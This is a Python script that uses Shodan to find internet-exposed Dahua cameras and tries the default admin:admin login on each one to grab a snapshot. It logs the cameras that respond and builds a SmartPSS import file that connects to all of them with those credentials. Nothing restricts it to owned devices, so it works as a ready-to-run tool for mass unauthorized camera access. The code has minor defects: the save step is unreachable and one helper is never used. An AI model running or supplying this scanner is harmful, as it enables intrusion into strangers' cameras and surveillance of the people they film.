import requests
import shodan
import argparse
from secrets import *

api = shodan.Shodan(SHODAN_API_KEY)

iplist = []
vulnlist = []

parser = argparse.ArgumentParser(description='Dahua Webcrawler / Vulnerability tester')
parser.add_argument("--count", default=100, type=int, help="Amount of hosts to be audited. Integer input only")
args = parser.parse_args()
am = args.count


# Make pretty colors :)
def pryellow(skk): print("\033[93m {}\033[00m".format(skk))


def prred(skk): print("\033[91m {}\033[00m".format(skk))


def prcyan(skk): print("\033[96m {}\033[00m".format(skk))


def prgreen(skk): print("\033[92m {}\033[00m".format(skk))


# Gets available Dahua Hosts from search query
def getaddresses(amount, query):
    limit = amount
    counter = 0
    for banner in api.search_cursor(query):
        ip = str(banner['ip_str'])
        print(ip)
        # city = str(banner['location'])
        iplist.append(ip)
        counter += 1
        if counter >= limit:
            break
    return iplist


# Generates link to which the request is sent, asking for a snapshot of first available channel using standard login
# credentials.
def linkbuilder():
    linklist = []
    for ip in iplist:
        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
        linklist.append(str(link))
    return linklist


# Makes request call to Dahua Product API, asking for a snapshot of first channel available
# If request is succesful (HTML code 200), True is returned for vulnerable with standard login credentials.
def request(link):
    try:
        response = requests.get(link, verify=False, timeout=3)
        if response.status_code == 200:
            return True
    except:
        return False
        pass


# Saves output (vulnerable IP's) to list.txt
def save():
    with open('./list.txt', 'w') as filehandle:
        for vuln in vulnlist:
            print('writing to file')
            filehandle.write('%s\n' % vuln)


# Creates device.xml template to be imported for SmartPSS
def gendevice():
    firstline = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    secondline = "<DeviceManager version=\"2.0\">"
    lastline = "</DeviceManager>"
    with open('./devices.txt', 'w') as filehandle:
        filehandle.write('%s\n' % firstline)
        filehandle.write('%s\n' % secondline)
        for vuln in vulnlist:
            nmbr = vulnlist.index(vuln)
            newdev = "<Device name=\"Webcrawler" + str(nmbr) + "\"" + " domain=" + "\"" + vuln + "\"" + " port=\"37777" \
                                                                                                        "\" " \
                                                                                                        "username" \
                                                                                                        "=\"admin\" " \
                                                                                                        "password" \
                                                                                                        "=\"admin\" " \
                                                                                                        "protocol=\"1" \
                                                                                                        "\" " \
                                                                                                        "connect=\"0" \
                                                                                                        "\" /> "
            filehandle.write('%s\n' % newdev)
        filehandle.write('%s\n' % lastline)


# You know what this does...
def percentage(vuln, total):
    try:
        return (vuln / total) * 100
    except ZeroDivisionError:
        return 0


def run(amount, query):
    getaddresses(amount, str(query))
    count = 0
    for ip in iplist:
        count += 1
        perc = ("%.2f" % (percentage(len(vulnlist), count)))
        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
        prcyan("trying: " + link)
        pryellow("Request number: " + str(count) + " | Amount vulnerable: " + str(len(vulnlist)) + "| Percentage "
                                                                                                   "vulnerable: " +
                 str(perc) + "%")
        if request(link):
            prgreen('Succes!')
            vulnlist.append(ip)
        else:
            prred("Fail!")
    return vulnlist
    print(save())

if __name__ == "__main__":
    print(run(am, "Dahua \"server: Dahua Rtsp Server\""))
    gendevice()
